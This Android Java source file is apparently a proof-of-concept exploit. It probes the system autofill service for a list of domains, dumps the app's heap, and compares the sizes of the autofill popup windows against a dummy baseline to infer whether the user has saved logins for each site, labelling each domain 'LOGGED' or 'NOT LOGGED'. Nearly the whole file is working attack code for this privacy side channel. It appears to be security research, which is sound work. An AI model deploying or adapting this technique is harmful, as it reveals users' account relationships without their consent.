package com.example.spill;

import android.graphics.Rect;
import android.os.Bundle;
import android.os.Debug;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.view.autofill.AutofillManager;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.Phaser;



public class MainActivity extends AppCompatActivity {
    private final String TAG = "MainActivity";
    private Thread thread;
    private AutofillManager autofillManager;
    private CustomTextView customTextView;
    private final Phaser phaser = new Phaser(2);
    private Handler mainHandler;
    private Rect bounds;

    //list of domain to check. The first one is the dummy domain to use as a reference window size for when the user is not logged
    public static List<String> domains = List.of("DEADBEEF", "a.com", "b.com");
    public static int index;
    private String outString = "";
    private TextView textView;


    private final AutofillManager.AutofillCallback autofillCallback = new AutofillManager.AutofillCallback() {
        @Override
        public void onAutofillEvent(View view, int virtualId, int event) {
            if (event == AutofillManager.AutofillCallback.EVENT_INPUT_SHOWN) {
                onAutofillShown();
            } else if (event == AutofillManager.AutofillCallback.EVENT_INPUT_HIDDEN
                    || event == AutofillManager.AutofillCallback.EVENT_INPUT_UNAVAILABLE) {
                onAutofillHidden();
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        textView = findViewById(R.id.textView);
        customTextView = findViewById(R.id.customTextView);
        textView.setImportantForAutofill(View.IMPORTANT_FOR_AUTOFILL_NO);

        autofillManager = getSystemService(AutofillManager.class);
        autofillManager.registerCallback(autofillCallback);

        bounds = new Rect(0, 0, 0, 0);
        mainHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public void onStart() {
        super.onStart();

        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        thread = new Thread(this::toRun);
        thread.start();
    }

    private void toRun() {
        Log.i(TAG, "Thread Started");

        //spawning the windows
        autofillManager.requestAutofill(customTextView, 3333, bounds);

        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        for(index = 0; index < domains.size(); index++) {
            autofillManager.requestAutofill(customTextView, 3333, bounds);

            phaser.arriveAndAwaitAdvance();
        }

        //dumping the heap to file
        File file = new File(getExternalFilesDir(null), "heapDump");
        try {
            Debug.dumpHprofData(file.getAbsolutePath());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        //searching for the autofill popup window objects
        int textViewCount = SharkBridge.countInstances(file, "android.view.autofill.AutofillPopupWindow");
        Log.d(TAG, "AutofillPopupWindow = " + textViewCount);

        List<SharkBridge.PopupWindowInfo> windows = SharkBridge.getAutofillPopupWindowSizes(file);
        for (SharkBridge.PopupWindowInfo info : windows) {
            Log.d(TAG, "Popup #" + info.getIndex()
                    + " width=" + info.getWidth()
                    + " height=" + info.getHeight());
        }

        int testSize = windows.get(0).getWidth() * windows.get(0).getHeight();
        for(int i = 1; i < domains.size(); i++) {

            int currSize = windows.get(i).getWidth() * windows.get(i).getHeight();

            if(currSize > testSize) {
                outString += (domains.get(i) + "  " + "LOGGED\n");
            } else {
                outString += (domains.get(i) + "  " + "NOT LOGGED\n");
            }

            mainHandler.post(() -> textView.setText(outString));
        }
    }

    private void onAutofillShown() {
        autofillManager.cancel();
        Log.d(TAG, "Autofill shown");
        phaser.arriveAndAwaitAdvance();
    }

    private void onAutofillHidden() {
        Log.d(TAG, "Autofill hidden");
    }
}